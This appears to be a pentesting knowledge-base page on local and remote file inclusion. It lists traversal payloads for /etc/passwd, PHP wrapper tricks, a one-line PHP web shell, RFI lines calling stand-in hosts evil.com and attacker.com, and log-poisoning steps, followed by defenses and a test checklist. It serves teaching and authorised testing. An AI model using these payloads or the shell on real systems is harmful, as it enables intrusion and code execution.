# LFI / RFI

Local and remote file inclusion testing.

## How It Works

Local File Inclusion (LFI) and Remote File Inclusion (RFI) arise when applications include or read files based on user-controlled paths without strict validation.

**LFI**: Attacker includes files on the server filesystem—configuration files, source code, logs, `/etc/passwd`—via path traversal:

```
?page=../../../etc/passwd
?page=....//....//etc/passwd
```

**RFI**: Attacker supplies a remote URL so the server fetches and executes attacker-controlled code (common in legacy PHP `include($_GET['page'])`):

```
?page=http://evil.com/shell.txt
```

PHP wrappers extend LFI impact:

- `php://filter/convert.base64-encode/resource=index.php` (source disclosure)
- `php://input` with POST body (code execution in some configs)
- `expect://id` when `expect` wrapper enabled

Log poisoning and `/proc/self/environ` techniques turn LFI into RCE by injecting PHP into access logs then including the log file.

## Exploitation

**LFI enumeration**

1. Identify parameters: `file`, `page`, `template`, `lang`, `document`.
2. Test traversal: `../../../../etc/passwd`, encoded variants (`%2e%2e%2f`).
3. Null byte `%00` on legacy PHP versions to truncate extensions: `shell.php%00`.

**PHP source extraction**

```
php://filter/convert.base64-encode/resource=../config.php
```

**RFI proof**

Host a text file on your server:

```php
<?php system($_GET['cmd']); ?>
```

Request: `?page=http://attacker.com/shell.txt`

**Log poisoning flow**

1. Poison Apache/Nginx log with PHP in User-Agent or request path.
2. Include log path: `/var/log/apache2/access.log` via LFI.
3. Execute commands via appended query parameters.

**Attack flow**

```
Path parameter → include()/read() → arbitrary local file or remote URL → info leak → RCE
```

## Defense & Mitigation

**Eliminate user-controlled file paths**. Map allowed pages to an allow-list:

```python
PAGES = {"home": "home.php", "about": "about.php"}
include(PAGES.get(page, "home.php"))
```

**Path canonicalization**

- Resolve paths with `realpath()` and verify result stays within intended directory.
- Reject `..`, absolute paths, and URL schemes (`http://`, `php://`).

**Configuration**

- Disable `allow_url_include` in PHP.
- Run apps with read-only filesystem where possible; no write access to web logs from untrusted input.

**WAF/rules**: Block traversal sequences as secondary control only.

**Monitoring**: Alert on repeated `%2e%2e` patterns and wrapper scheme usage in parameters.

## Methodology

- [ ] Identify file/path parameters
- [ ] Test path traversal sequences
- [ ] Attempt log poisoning and PHP wrappers
- [ ] Check for RFI via remote URL inclusion

## Tools

| Tool | Usage |
|------|-------|
| `ffuf` | [Web fuzzer](../../TOOLS_GUIDE.md#ffuf) |
| `burp` | [Intercept, repeater & scanner](../../TOOLS_GUIDE.md#burp-suite) |
| `lfi-suite` | [LFI exploitation](../../TOOLS_GUIDE.md#lfi-suite) |

## Resources

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PortSwigger File Path Traversal](https://portswigger.net/web-security/file-path-traversal)

## Verification Checklist

- [ ] Review scope and rules of engagement
- [ ] Document baseline behavior
- [ ] Test edge cases and parser differentials
- [ ] Capture proof-of-concept safely
- [ ] Write remediation guidance
